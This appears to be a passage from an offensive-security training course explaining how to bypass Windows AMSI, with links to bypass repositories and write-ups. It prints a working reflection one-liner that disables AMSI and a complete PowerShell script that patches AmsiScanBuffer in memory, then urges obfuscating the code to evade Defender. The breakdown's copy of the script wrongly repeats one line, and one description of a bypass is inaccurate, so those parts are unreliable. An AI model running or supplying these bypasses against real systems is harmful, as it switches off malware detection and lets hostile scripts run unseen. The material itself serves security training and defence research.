Now that we understand the basics of AMSI and how its instrumented, we can begin bypassing AMSI using PowerShell and C#.  

There are a large number of bypasses for AMSI available, a majority written in PowerShell and C#. Find a list of common bypasses below.  

- Patching amsi.dll
- Amsi ScanBuffer patch
- Forcing errors
- Matt Graeber's Reflection, [](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)[https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
- PowerShell downgrade

For more information about the variety of bypasses available, check out this GitHub repo, [https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)  


> [!info]
> We will be looking at the `Matt Graeber reflection method` as well as patching `amsi.dll`.



The first bypass we will be looking at utilizes native PowerShell reflection to set the response value of AMSI to `$null`. Find the PowerShell code written by Matt Graeber below.

`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`

The second method we will be looking at is patching amsi.dll written in PowerShell. This bypass is modified by BC-Security inspired by Tal Liberman, [https://github.com/BC-SECURITY/Empire/blob/master/lib/common/bypasses.py](https://github.com/BC-SECURITY/Empire/blob/master/lib/common/bypasses.py). RastaMouse also has a similar bypass written in C# that uses the same technique, [https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs](https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs).The bypass will identify DLL locations and modify memory permissions to return undetected AMSI response values.

```
$MethodDefinition = "  
  
    [DllImport(`"kernel32`")]  
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);  
  
    [DllImport(`"kernel32`")]  
    public static extern IntPtr GetModuleHandle(string lpModuleName);  
  
    [DllImport(`"kernel32`")]  
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);  
";  
  
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;  
$ABSD = 'AmsiS'+'canBuffer';  
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');  
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);  
[UInt32]$Size = 0x5;  
[UInt32]$ProtectFlag = 0x40;  
[UInt32]$OldProtectFlag = 0;  
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);  
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);   
  
[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
```

This may seem like a lot of fancy and chopped-up code if you are unfamiliar with Windows architecture and PowerShell, but we can break it up and identify what each section of code does.  

The first section of code lines 3 - 10 will use C# to call-in functions from Kernel32 to identify where amsi.dll has been loaded.

```
[DllImport(`"kernel32`")]  
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport(`"kernel32`")]  
public static extern IntPtr GetModuleHandle(string lpModuleName);

[DllImport(`"kernel32`")]  
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
```

Once the C# functions are called in, the code will use Add-type to load the C# and identify the `AmsiScanBuffer` string in lines 13 - 16. This string can be used to determine where `amsi.dll` has been loaded and the address location using `GetProcAddress`.

```
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;  
$ABSD = 'AmsiS'+'canBuffer';  
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');  
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
```

The next section of code lines 17 - 23 will modify memory permissions and patch `amsi.dll` to return a specified value.

```
[UInt32]$Size = 0x5;  
[UInt32]$Size = 0x5;  
[UInt32]$OldProtectFlag = 0;  
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);  
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);

[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
```

At this stage, we should have an AMSI bypass that partially works. Signatures for most AMSI bypasses have been crafted, so this means that AMSI and Defender themselves will catch these bypasses. This means <u>we will need to obfuscate our code</u> a slight bit to evade signatures. AMSI obfuscation will be covered in the next task.  

For more information about AMSI bypasses, check out the following resources.  

- [](https://offensivedefence.co.uk/posts/making-amsi-jump/)[https://offensivedefence.co.uk/posts/making-amsi-jump/](https://offensivedefence.co.uk/posts/making-amsi-jump/)
- [](https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf)[https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf](https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf)
- [](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)[https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
- [](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim)[https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim)
- [](https://blog.f-secure.com/hunting-for-amsi-bypasses/)[https://blog.f-secure.com/hunting-for-amsi-bypasses/](https://blog.f-secure.com/hunting-for-amsi-bypasses/)
- [](https://www.contextis.com/us/blog/amsi-bypass)[https://www.contextis.com/us/blog/amsi-bypass](https://www.contextis.com/us/blog/amsi-bypass)
- [](https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass)[https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass](https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass)
- [https://amsi.fail/](https://amsi.fail/)[](https://amsi.fail/)
- [](https://rastamouse.me/blog/asb-bypass-pt2/)[https://rastamouse.me/blog/asb-bypass-pt2/](https://rastamouse.me/blog/asb-bypass-pt2/)
- [](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)[https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)
- [](https://www.youtube.com/watch?v=F_BvtXzH4a4)[https://www.youtube.com/watch?v=F_BvtXzH4a4](https://www.youtube.com/watch?v=F_BvtXzH4a4)
- [https://www.youtube.com/watch?v=lP2KF7_Kwxk](https://www.youtube.com/watch?v=lP2KF7_Kwxk)
- [](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)[https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)

